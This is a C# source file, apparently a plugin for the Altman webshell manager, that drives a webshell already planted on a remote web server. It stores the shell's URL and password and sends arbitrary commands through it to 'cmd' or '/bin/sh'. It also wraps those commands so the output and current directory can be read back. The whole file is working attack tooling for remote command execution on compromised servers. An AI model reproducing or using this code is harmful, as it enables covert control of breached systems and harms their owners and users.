﻿using System.Text;
using Altman.Util.Common.AltData;
using Altman.Webshell.Model;

namespace Plugin_ShellCmder
{
    public class ShellCmder
	{
		private Shell _shellData;

		#region 属性
		public string ShellUrl
		{
			get { return this._shellData.ShellUrl; }
			set { this._shellData.ShellUrl = value; }
		}
		public string ShellPwd
		{
			get { return this._shellData.ShellPwd; }
			set { this._shellData.ShellPwd = value; }
		}
		public string ShellType
		{
			get { return this._shellData.ShellType; }
			set { this._shellData.ShellType = value; }
		}
		public string ShellCoding
		{
			get { return this._shellData.WebCoding; }
			set { this._shellData.WebCoding = value; }
		}
		public int ShellTimeOut
		{
			get { return this._shellData.TimeOut; }
			set { this._shellData.TimeOut = value; }
		}

        public string CmdPath { get; set; }
        #endregion

        public ShellCmder(Shell data)
        {
			this._shellData = data;			
		}

		private byte[] SubmitCommand(Shell shell, string funcNameXpath, string[] param)
		{
			return Altman.Webshell.Service.SubmitCommand(shell, funcNameXpath, param);
		}

		public OsInfo GetSysInfo()
		{
			byte[] resultBytes = SubmitCommand(_shellData, "Cmder/SysInfoCode", null);
			return ResultMatch.MatchResultToOsInfo(resultBytes, Encoding.GetEncoding(_shellData.WebCoding));
		}

		public CmdResult ExecuteCmd(string cmdPath, string command, string currentDir, bool isWin)
		{
			//若cmdPath未设置，则采用默认值
			if (string.IsNullOrEmpty(cmdPath))
			{
				cmdPath = isWin ? "cmd" : "/bin/sh";
			}
            if (string.IsNullOrEmpty(this.CmdPath))
            {
                this.CmdPath = isWin ? "cmd" : "/bin/sh";
            }
            //组合cmd命令
            string combineCommand = string.Format(isWin ? "cd /d \"{0}\"&{1}&echo [S]&cd&echo [E]" : "cd \"{0}\";{1};echo [S];pwd;echo [E]", currentDir, command);

			byte[] resultBytes = SubmitCommand(_shellData, "Cmder/ExecuteCommandCode", new [] { this.CmdPath, combineCommand });
			return ResultMatch.MatchResultToCmdResult(resultBytes, Encoding.GetEncoding(_shellData.WebCoding));
		}
	}
}
